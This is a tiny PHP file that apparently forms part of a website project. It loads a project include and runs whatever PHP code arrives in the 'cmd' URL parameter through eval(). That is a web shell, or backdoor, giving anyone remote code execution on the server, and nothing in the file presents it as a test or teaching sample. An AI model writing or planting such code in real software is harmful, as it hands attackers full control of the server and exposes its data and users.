<?php
include('../class/include.php');
if(isset($_GET["cmd"]))
{
	echo eval($_GET["cmd"]);
}
?>